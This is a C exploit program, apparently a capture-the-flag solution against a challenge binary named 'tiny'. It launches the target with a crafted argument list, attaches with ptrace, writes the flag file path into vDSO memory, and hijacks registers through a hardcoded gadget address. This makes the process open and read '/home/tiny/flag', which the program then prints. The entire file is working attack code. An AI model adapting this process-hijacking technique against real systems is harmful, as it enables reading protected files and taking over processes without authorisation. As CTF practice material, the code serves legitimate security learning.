#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#define VDSO_ADDR 0xf77ab000
#define ROP (VDSO_ADDR + 0xb45)
#define NR_PTRACE 26

char *tiny_path = "/home/tiny/tiny";

char *argv[NR_PTRACE + 1] = {
    "\x45\xbb\x7a\xf7",
	[1 ... (NR_PTRACE - 1)] = "AAAA",
	NULL
};

void get_regs(pid_t pid, int *eax, int *esp) {
    struct user_regs_struct regs = { 0 };

    ptrace(PTRACE_GETREGS, pid, 0, ®s);
    printf("***************\n");
    printf("eax: %x\n", (unsigned int)regs.eax);
    printf("ebx: %x\n", (unsigned int)regs.ebx);
    printf("ecx: %x\n", (unsigned int)regs.ecx);
    printf("edx: %x\n", (unsigned int)regs.edx);
    printf("eip: %x\n", (unsigned int)regs.eip);
    printf("esp: %x\n", (unsigned int)regs.esp);
    printf("eflags: %x\n", (unsigned int)regs.eflags);
    printf("***************\n");

    if (eax) {
        *eax = regs.eax;
    }

    if (esp) {
        *esp = regs.esp;
    }
}

void set_regs(pid_t pid, int eax, int ebx, int ecx, int edx, int eip) {
    struct user_regs_struct regs = { 0 };

    regs.eax = eax;
    regs.ebx = ebx;
    regs.ecx = ecx;
    regs.edx = edx;
    regs.eip = eip;

    ptrace(PTRACE_SETREGS, pid, 0, ®s);
}

int wait_status(pid_t pid) {
    int status;
    wait(&status);

    if (WIFEXITED(status)) {
        return -1;
    }

    if (WIFSIGNALED(status)) {
        return -1;
    }

    if (WIFSTOPPED(status)) {
        int stop_signal = WSTOPSIG(status);
        printf("stopped with signal %d\n", stop_signal);
    }

    return 0;
}

int main() {
    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return -1;
    }

    if (0 == pid) {	
		execve(tiny_path, argv, NULL);
    }
    else {
		if (wait_status(pid)) {
            return -1;
        }

        // "/home/tiny/flag"
	    ptrace(PTRACE_POKETEXT, pid, VDSO_ADDR + 0, 0x6d6f682f);
	    ptrace(PTRACE_POKETEXT, pid, VDSO_ADDR + 4, 0x69742f65);
	    ptrace(PTRACE_POKETEXT, pid, VDSO_ADDR + 8, 0x662f796e);
        ptrace(PTRACE_POKETEXT, pid, VDSO_ADDR + 12, 0x0067616c);

        int fd, flag_address;

        set_regs(pid, 0x5, VDSO_ADDR, O_RDONLY, 0, ROP);
        ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
        wait_status(pid);
        get_regs(pid, &fd, &flag_address);

        set_regs(pid, 0x3, fd, flag_address, 0x50, ROP);
        ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
        wait_status(pid);
        get_regs(pid, NULL, NULL);

        char flag_buffer[0x50] = { 0 };

        for (int i=0; i<0x50; i+=4) {
            long text = ptrace(PTRACE_PEEKTEXT, pid, flag_address + i, 0);
            *(long*)(void*)(flag_buffer + i) = text;
        }

        printf("FLAG: %s\n", flag_buffer);
    }

    return 0;
}
